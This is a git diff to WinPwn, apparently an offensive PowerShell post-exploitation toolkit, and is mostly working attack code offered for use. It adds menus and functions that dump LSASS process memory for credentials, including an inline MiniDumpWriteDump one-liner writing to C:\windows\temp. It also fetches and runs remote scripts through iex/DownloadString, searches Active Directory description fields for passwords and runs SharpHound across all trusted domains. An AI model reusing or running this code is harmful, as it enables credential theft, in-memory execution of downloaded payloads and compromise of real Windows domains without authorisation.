@@ -642,6 +642,144 @@ __        ___       ____
         }
         While ($masterquestion -ne 12)
 }
+
+
+function lsassdumps
+{
+        do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> Dump lsass for sweet creds
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Use HandleKatz! '
+            Write-Host -ForegroundColor Green '2. Use WerDump! '
+            Write-Host -ForegroundColor Green '3. Dump lsass using rundll32 technique!'
+            Write-Host -ForegroundColor Green '4. Dump lsass using NanoDump!'
+            Write-Host -ForegroundColor Green '5. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{if(isadmin){HandleKatz}}
+                2{if(isadmin){werDump}}
+                3{if(isadmin){Dumplsass}}
+                4{if(isadmin){NanoDumpChoose}}
+             }
+        }
+        While ($masterquestion -ne 5)
+
+}
+
+function NanoDumpChoose
+{
+        do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> NanoDump Submenu
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Dump LSASS with a valid signature! '
+            Write-Host -ForegroundColor Green '2. Dump LSASS with an invalid signature, has to be restored afterwards (see NanoDump README)! '
+            Write-Host -ForegroundColor Green '3. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{if(isadmin){NanoDump -valid}}
+                2{if(isadmin){NanoDump}}
+            }
+        }
+        While ($masterquestion -ne 3)
+
+}
+
+function NanoDump
+{
+<#
+    .DESCRIPTION
+        Execute NanoDump Shellcode to dump lsass.
+        Main Credits to https://github.com/helpsystems/nanodump
+        Author: Fabian Mosch, Twitter: @ShitSecure
+    #>
+
+Param
+    (
+        [switch]
+        $valid
+)
+
+    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1')
+
+    if ($valid)
+    {
+        Invoke-NanoDump -valid
+    }
+    else
+    {
+        Invoke-NanoDump
+    }
+}
+
+function werDump
+{
+  <#
+        .DESCRIPTION
+        Dump lsass via wer, credit goes to https://twitter.com/JohnLaTwC/status/1411345380407578624
+        Author: @S3cur3Th1sSh1t
+    #>
+    Write-Host "Dumping to C:\windows\temp\dump.txt"
+    $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$ProcessDumpPath = 'C:\windows\temp\dump.txt';$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create);$p=Get-Process lsass;$Result = $MiniDumpWriteDump.Invoke($null, @($p.Handle,$p.Id,$FileStream.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$FileStream.Close()
+    if (test-Path "C:\windows\temp\dump.txt")
+    {
+        Write-Host "Lsass dump success: " $Result
+    }
+
+}
+
+function HandleKatz
+{
+  <#
+        .DESCRIPTION
+        Dump lsass, credit goes to https://github.com/codewhitesec/HandleKatz, @thefLinkk
+        Author: @S3cur3Th1sSh1t
+    #>
+     param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if (isadmin)
+    {
+      $processes = Get-Process
+      $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
+      
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Handlekatz.ps1')
+      
+      Invoke-HandleKatz -handProcID $dumpid
+      
+      Write-Host "The dump via HandleKatz is obfuscated to avoid lsass dump detections on disk. To decode it you can/should use the following: https://github.com/codewhitesec/HandleKatz/blob/main/Decoder.py"
+    }
+    else{Write-Host "No Admin rights, start again using a privileged session!"}
+}
+
 function Decryptteamviewer
 {
   param(
@@ -1959,7 +2097,7 @@ __        ___       ____
     {
         reconAD
         generaldomaininfo -noninteractive 
-        sharphound 
+        sharphound -noninteractive 
         IEX($viewdevobfs)
         Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
         shareenumeration
@@ -2031,7 +2169,7 @@ __        ___       ____
         {
              1{generaldomaininfo}
              2{reconAD}
-             3{Sharphound}
+             3{SharpHoundMenu}
              4{IEX($viewdevobfs)
              Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"}
              5{shareenumeration}
@@ -2074,19 +2212,19 @@ function Invoke-ADCSTemplateRecon
     IEX($Certify)
 
     Write-Host -ForegroundColor Yellow "Collecting general CA/ADCS informations!"
-    if(!$consoleoutput){Invoke-Certify -Command "cas" >> "$currentPath\DomainRecon\ADCS_Infos.txt"}else{Invoke-Certify -Command "cas"}
+    if(!$consoleoutput){Invoke-Certify cas >> "$currentPath\DomainRecon\ADCS_Infos.txt"}else{Invoke-Certify cas}
 
     Write-Host -ForegroundColor Yellow "Checking enrolleeSuppliesSubject templates!"
-    if(!$consoleoutput){Invoke-Certify -Command "find /enrolleeSuppliesSubject" >> "$currentPath\DomainRecon\ADCS_enrolleeSuppliesSubject.txt"}else{Invoke-Certify -Command "find /enrolleeSuppliesSubject"}
+    if(!$consoleoutput){Invoke-Certify find /enrolleeSuppliesSubject >> "$currentPath\DomainRecon\ADCS_enrolleeSuppliesSubject.txt"}else{Invoke-Certify find /enrolleeSuppliesSubject}
 
     Write-Host -ForegroundColor Yellow "Checking templates with Client authentication enabled!"
-    if(!$consoleoutput){Invoke-Certify -Command "find /clientauth" >> "$currentPath\DomainRecon\ADCS_ClientAuthTemplates.txt"}else{Invoke-Certify -Command "find /clientauth"}
+    if(!$consoleoutput){Invoke-Certify find /clientauth >> "$currentPath\DomainRecon\ADCS_ClientAuthTemplates.txt"}else{Invoke-Certify find /clientauth}
 
     Write-Host -ForegroundColor Yellow "Checking all templates permissions!"
-    if(!$consoleoutput){Invoke-Certify -Command "find /showAllPermissions" >> "$currentPath\DomainRecon\ADCS_Template_AllPermissions.txt"}else{Invoke-Certify -Command "find /showAllPermissions"}
+    if(!$consoleoutput){Invoke-Certify find /showAllPermissions >> "$currentPath\DomainRecon\ADCS_Template_AllPermissions.txt"}else{Invoke-Certify find /showAllPermissions}
 
     Write-Host -ForegroundColor Yellow "Enumerate access control information for PKI objects!"
-    if(!$consoleoutput){Invoke-Certify -Command "pkiobjects" >> "$currentPath\DomainRecon\ADCS_Template_AllPermissions.txt"}else{Invoke-Certify -Command "pkiobjects"}
+    if(!$consoleoutput){Invoke-Certify pkiobjects >> "$currentPath\DomainRecon\ADCS_Template_AllPermissions.txt"}else{Invoke-Certify pkiobjects}
 
 
     Write-Host -ForegroundColor Yellow "You should check the privileges/groups for enrollment and or for modification rights!"
@@ -2106,7 +2244,7 @@ function Invoke-VulnerableADCSTemplates
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 
     IEX($Certify)
-    if(!$consoleoutput){Invoke-Certify -Command "find /vulnerable" >> "$currentPath\Vulnerabilities\ADCSVulnerableTemplates.txt"}else{Invoke-Certify -Command "find /vulnerable"}
+    if(!$consoleoutput){Invoke-Certify find /vulnerable >> "$currentPath\Vulnerabilities\ADCSVulnerableTemplates.txt"}else{Invoke-Certify find /vulnerable}
 
 }
 
@@ -2120,6 +2258,16 @@ function generaldomaininfo{
     )
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    
+     #Search for AD-Passwords in description fields
+    Write-Host -ForegroundColor Yellow '------->  Searching for passwords in active directory description fields..'
+    
+    iex ($admodule)            
+    
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/adpass.ps1')
+
+    if(!$consoleoutput){thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"}else{Write-Host -ForegroundColor Yellow '------->  Passwords in description fields:';thyme}
+
     
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/view.ps1')
     $domain_Name = skulked
@@ -2209,16 +2357,43 @@ function generaldomaininfo{
   if(!$consoleoutput){Discover-PSInterestingServices >> "$currentPath\DomainRecon\SPNScan_InterestingServices.txt"}else{Write-Host -ForegroundColor Yellow "------->  InterestingSPNs";Discover-PSInterestingServices}
     
 	    
-    #Search for AD-Passwords in description fields
-    Write-Host -ForegroundColor Yellow '------->  Searching for passwords in active directory description fields..'
-    
-    iex ($admodule)            
-    
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/adpass.ps1')
-
-    if(!$consoleoutput){thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"}else{Write-Host -ForegroundColor Yellow '------->  Passwords in description fields:';thyme}
-
     if(!$consoleoutput){Get-ADUser -Filter {UserAccountControl -band 0x0020} >> "$currentPath\Vulnerabilities\UsersWithoutPasswordPolicy.txt"}else{Write-Host -ForegroundColor Yellow '------->  Users without password policy:';Get-ADUser -Filter {UserAccountControl -band 0x0020}}
+
+# Dictionary to hold superclass names
+$superClass = @{}
+
+# List to hold class names that inherit from container and are allowed to live under computer object
+$vulnerableSchemas = [System.Collections.Generic.List[string]]::new()
+
+# Resolve schema naming context
+$schemaNC = (Get-ADRootDSE).schemaNamingContext
+
+# Enumerate all class schemas
+$classSchemas = Get-ADObject -LDAPFilter '(objectClass=classSchema)' -SearchBase $schemaNC -Properties lDAPDisplayName,subClassOf,possSuperiors
+
+# Enumerate all class schemas that computer is allowed to contain
+$computerInferiors = $classSchemas |Where-Object possSuperiors -eq 'computer'
+
+# Populate superclass table
+$classSchemas |ForEach-Object {
+    $superClass[$_.lDAPDisplayName] = $_.subClassOf
+}
+
+# Resolve class inheritance for computer inferiors
+$computerInferiors |ForEach-Object {
+  $class = $cursor = $_.lDAPDisplayName
+  while($superClass[$cursor] -notin 'top'){
+    if($superClass[$cursor] -eq 'container'){
+      $vulnerableSchemas.Add($class)
+      break
+    }
+    $cursor = $superClass[$cursor]
+  }
+}
+
+# Outpupt list of vulnerable class schemas 
+$vulnerableSchemas
+if(!$consoleoutput){$vulnerableSchemas >> "$currentPath\Vulnerabilities\VulnerableSchemas.txt"}else{Write-Host -ForegroundColor Yellow '------->  Found vulnerable old Exchange Schema (https://twitter.com/tiraniddo/status/1420754900984631308):';$vulnerableSchemas}
 
     Write-Host -ForegroundColor Yellow '-------> Searching for Users without password Change for a long time'
   $Date = (Get-Date).AddYears(-1).ToFileTime()
@@ -3059,12 +3234,47 @@ function Get-currentIP
     return $IPaddress
 }
 
+function SharpHoundMenu
+{
+  @'
+
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+
+   --> SharpHoundMenu
+
+'@
+    do
+    {
+        Write-Host "================ WinPwn ================"
+        Write-Host -ForegroundColor Green '1. Run SharpHound for the current domain!'
+        Write-Host -ForegroundColor Green '2. Run SharpHound for another domain! '
+        Write-Host -ForegroundColor Green '3. Run SharpHound for all trusted domains! '
+        Write-Host -ForegroundColor Green '4. Go back '
+        Write-Host "================ WinPwn ================"
+        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+
+        Switch ($masterquestion) 
+        {
+             1{Sharphound -noninteractive}
+             2{SharpHound}
+             3{SharpHound -alltrustedomains}
+       }
+    }
+  While ($masterquestion -ne 4)
+
+}
+
 function Sharphound
 {
   <#
         .DESCRIPTION
         Downloads Sharphound.exe and collects All AD-Information for Bloodhound https://github.com/BloodHoundAD
-        Author: @S3cur3Th1sSh1t
+        Author: @S3cur3Th1sSh1t, @Luemmelsec
         License: BSD 3-Clause
     #>
     #Domain Recon / Lateral Movement Phase
@@ -3072,17 +3282,37 @@ function Sharphound
         [Switch]
         $noninteractive,
         [Switch]
-        $consoleoutput   
+        $consoleoutput,
+        [Switch]
+        $alltrustedomains   
     )
-    $Wcl = new-object System.Net.WebClient
-    $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+
     
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharphound3.ps1')
     Write-Host -ForegroundColor Yellow 'Running Sharphound Collector: '
-    Invoke-Sharphound3
+    
+    if ($noninteractive)
+    {
+        Invoke-Sharphound3 -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
+    }
+    elseif($alltrustedomains)
+    {
+        IEX($admodule)
+        $TrustedDomains = (Get-ADForest).Domains
+        foreach ($TrustedDomain in $TrustedDomains)
+        {
+            Invoke-Sharphound3 -command "-c All,GPOLocalGroup -d $TrustedDomain --ZipFileName $TrustedDomain.zip --OutputDirectory $currentPath"
+        }
+        
+    }
+    else
+    {
+        $otherdomain = Read-Host -Prompt 'Pleas enter the domain to collect data from: '
+        Invoke-Sharphound3 -command "-c All,GPOLocalGroup -d $otherdomain --OutputDirectory $currentPath"
+    }
 }
 
 function oldchecks
@@ -4302,7 +4532,8 @@ __        ___       ____
       Write-Host -ForegroundColor Green '14. Load custom C# Binaries from a webserver to Memory and execute them!'
       Write-Host -ForegroundColor Green '15. DomainPasswordSpray Attacks!'
       Write-Host -ForegroundColor Green '16. Reflectively load Mimik@tz into memory!'
-        Write-Host -ForegroundColor Green '17. Exit. '
+      Write-Host -ForegroundColor Green '17. Dump lsass via various techniques!'
+        Write-Host -ForegroundColor Green '18. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -4324,10 +4555,11 @@ __        ___       ____
           14{sharpcradle -web}
             15{domainpassspray}
           16{mimiload}
+          17{lsassdumps}
         
     }
     }
-  While ($masterquestion -ne 17)
+  While ($masterquestion -ne 18)
      
    
 }
